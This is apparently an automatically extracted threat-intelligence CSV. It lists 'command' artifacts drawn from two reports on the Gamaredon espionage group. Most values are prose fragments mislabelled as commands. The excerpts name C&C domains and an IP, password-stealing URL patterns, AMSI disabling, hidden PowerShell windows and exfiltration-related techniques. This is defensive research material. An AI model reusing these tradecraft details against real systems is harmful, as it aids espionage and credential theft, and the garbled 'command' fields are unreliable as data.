schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:990d75c526903f5e052a147b391e7f4ef6a3aafc8c1fff5c525b24231cc4e261,command,PowerShell,PowerShell,candidate,2023-12-04T00:00:00Z,day,known,same-record,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,47 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IP Domain Hosting provider First seen Details N/A loturam[.]ru N/A 2023-12-04 Gamaredon C&C server. N/A nikortal[.]ru N/A 2023-12-06 Gamaredon C&C server. N/A nododru[.]ru N/A 2023-12-20 Gamaredon C&C server. 62.133.62[.]73 N/A GLOBAL INTERNET SOLUTIONS LLC 2023-12-20 Gamaredon C&C server. MITRE ATT&CK TECHNIQUES This table was built usin g version 15 of the MITRE ATT&CK framework . Tactic ID Name De,
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:7d59f29b7b52f1e2129f7acdfbc75462cd6bbe6f7e49f5753cacd40e6d658048,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:99951d3ca5d66f7f0b45be23d6c5f05c33f5be5a6e62b1d4dd37db33ca835733,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances MITRE ATT&CK TECHNIQUES This table was built using version 1 9 of the MITRE ATT&CK framework. Tactic ID Name Description Resource Development T1583.001 Acquire Infrastructure: Domains Gamaredon registers domains for its C&C servers. T1583.003 Acquire Infrastructure: Virtual Private Server Gamaredon rents servers for its C&C infrastructure. T1583.007 Acquire Infrastructure: Serverless Gamaredon hides its C&C infrastr",
1.0.0,actor--gamaredon,artifact--sha256:32d87daa0332e6dcec3374084e9215d65fbe225ee638052307984a85e0e2d37d,observation--sha256:36ff060a1ff384b6411a41f045f5da585be92732c5fb629efc52cd0345ddb1c0,command,"PowerShell , and is reported on in both of our previous Gamaredon white papers . On March 17th, 2025, we","PowerShell , and is reported on in both of our previous Gamaredon white papers . On March 17th, 2025, we",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 16. An example of a PteroVDoor decryptor Persistence PteroVDoor instances observed until May 31st, 2025 ensure persistence via the HKCU Run key with the registry value named GooglePhone . The instances observed between May 31st, 2025 and September 18th, 2025 don’t use any persistence mechanisms. And the instances observed after September 18th, 2025 are persisted via the PteroVDoor decryptor, which loads them ",
1.0.0,actor--gamaredon,artifact--sha256:7964d0be0d485c78aeb56a287ec37aededb6a022a95f6348087b23d1dffd0170,observation--sha256:df07fbfc9496e4dc9752e30a584ec10c5cb75c29813438c3d34a2957f9a2882b,command,"PowerShell command. This command downloads a payload from the hardcoded C&C IP address, splits it","PowerShell command. This command downloads a payload from the hardcoded C&C IP address, splits it",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:ac79beeec62c3311bb2c63d256febd5185b8a5b47ce42674904617f20e8a7564,observation--sha256:2341176fe2e9e688c93cb5cf1765eb27042c44196d8c00527cd2dcc3810402dd,command,PowerShell commands.,PowerShell commands,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:ac79beeec62c3311bb2c63d256febd5185b8a5b47ce42674904617f20e8a7564,observation--sha256:9e20b1833dc7f8528739cc098c598ff54e8b102f590b439cd032f17305e29e89,command,PowerShell commands.,PowerShell commands,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"36 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1564.003 Hide Artifacts: Hidden Window Various Gamaredon tools spawn PowerShell processes with hidden windows. T1564.004 Hide Artifacts: NTFS File Attributes Various Gamaredon tools use alternate data streams to hide themselves and their C&C servers. T1070.004 Indicator Removal: File Deletion PteroBox, PteroPSDoor, and PteroVDoor delete staged files after successful exfiltration. T1036.00",
1.0.0,actor--gamaredon,artifact--sha256:42ab43e5fd8c358b27ee99c50b45b6a6a373af8d1f9e09516cbe25ec0399470b,observation--sha256:1d515b70d9265c97498bd0a8315065f667519cc955c03f3a50920798d062643b,command,PowerShell loader from a random registry value under HKCU\Cursors . This loader executes the initial part,PowerShell loader from a random registry value under HKCU\Cursors . This loader executes the initial part,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances described in detail in our Gamaredon 2024 white paper. That version was being used without notable updates until March 23rd, 2025, when it was replaced with a new version. Two days later , 2025, we discovered this updated version, now featuring additional obfuscation and an empty URI path in HTTP requests. Lacking a unique URI, on which we based our naming of all the previous versions , we named it version 13, as it",
1.0.0,actor--gamaredon,artifact--sha256:0d774f93d49bd62b90eb21b9d6b7b24db138e78e60bbefc6f20cb2ff7d4917ba,observation--sha256:e84aae85619ef7de479a055497a3189cc72d28338817f45b0bd8aa8ab531f582,command,PowerShell loader wrapped in VBScript in the Startup directory with a randomly generated .vbs,PowerShell loader wrapped in VBScript in the Startup directory with a randomly generated .vbs,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:053ec5a894789ea0291d915a90c6a4922f688f183bb502a7dc3ae1b321811b50,observation--sha256:cd93d05a86437cbac0bf22afcc64e65c793c74992d4951d710924ffdfcb67711,command,"PowerShell or VBScript, and many are obfuscated. The following paragraphs showcase and describe the","PowerShell or VBScript, and many are obfuscated. The following paragraphs showcase and describe the",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Obfuscation To avoid detection and to make it more difficult for researchers to dissect its malware, Gamaredon often applies obfuscation to its tools. Most of Gamaredon ’s currently used tools a re scripts written in PowerShell or VBScript, and many are obfuscated. The following paragraphs showcase and describe the most common types of obfuscation used in Gamaredon ’s tools . Note that there are myri",
1.0.0,actor--gamaredon,artifact--sha256:e1a938cb1ac9de8aba10ad14657831aededcb2dd515b70eaad555d5bfa802065,observation--sha256:a7badd4b8e6ed938e28c7285f7857fdb4f156da1f4bd5c576ced0423209838b7,command,PowerShell payload via the,PowerShell payload via the,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:6367e3c1ac1e31a0096870dd854e5fe54c3caec2dfbdf007a38bca459fd92fae,observation--sha256:e9bf6cae2da6b1882faa83f39e34796db1c57484450e243d500103a1600b4e35,command,"PowerShell payload via the Telegra.ph API , and runs it in memory.","PowerShell payload via the Telegra.ph API , and runs it in memory",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:30a206de5488a8e13f7ec123768436c8c07b85587e9c04940bd10c1d78e340a2,observation--sha256:ca0feae63547b3d470f3ff6ffa747bc75f725dc7ce41d1b47798c014ece5a167,command,PowerShell payloads.,PowerShell payloads,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:dfcfb17cf772eb29a9549428cf46d0911ada2e38077e2e9d4a618a8b77e2c97a,observation--sha256:0a3a82a84349345f0de3497509ab6785fa7a64c69615178c2fed13bdbfa7f6d9,command,PowerShell payloads. PteroEffigy does not use any persistence mechanism and is executed in memory,PowerShell payloads. PteroEffigy does not use any persistence mechanism and is executed in memory,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:7e651a2379bd3b4f169a7607b75d200c30edc294bf2c314108d9016bb46a8870,observation--sha256:5f60b62d052d62d66d4acad1ccd567fca53ae7ea9254d05e3d3ef928d8df40f4,command,PowerShell processes with hidden,PowerShell processes with hidden,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"36 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1564.003 Hide Artifacts: Hidden Window Various Gamaredon tools spawn PowerShell processes with hidden windows. T1564.004 Hide Artifacts: NTFS File Attributes Various Gamaredon tools use alternate data streams to hide themselves and their C&C servers. T1070.004 Indicator Removal: File Deletion PteroBox, PteroPSDoor, and PteroVDoor delete staged files after successful exfiltration. T1036.00",
1.0.0,actor--gamaredon,artifact--sha256:b01db8d7e8224ab4466dd20626af796dca640663901697d537fdfb554f26b324,observation--sha256:1fb6c9aaa23305028d7f27971702372410389941ef277b8996a5423889a103b3,command,PowerShell script from a hardcoded IP address using an HTTP GET request with the URI /cmd . Then it,PowerShell script from a hardcoded IP address using an HTTP GET request with the URI /cmd . Then it,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:5dbf661afecc117e7cd5d72ea7964de61dc30ccfad762a36e5d708c1ac98748f,observation--sha256:5fa0f8649db22ea60de8f120b01775e5916e5bc30e98a76a19fbfda25552ea2d,command,PowerShell tool providing partial SO CKS proxy functionality. It consists of two parts that were taken,PowerShell tool providing partial SO CKS proxy functionality. It consists of two parts that were taken,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
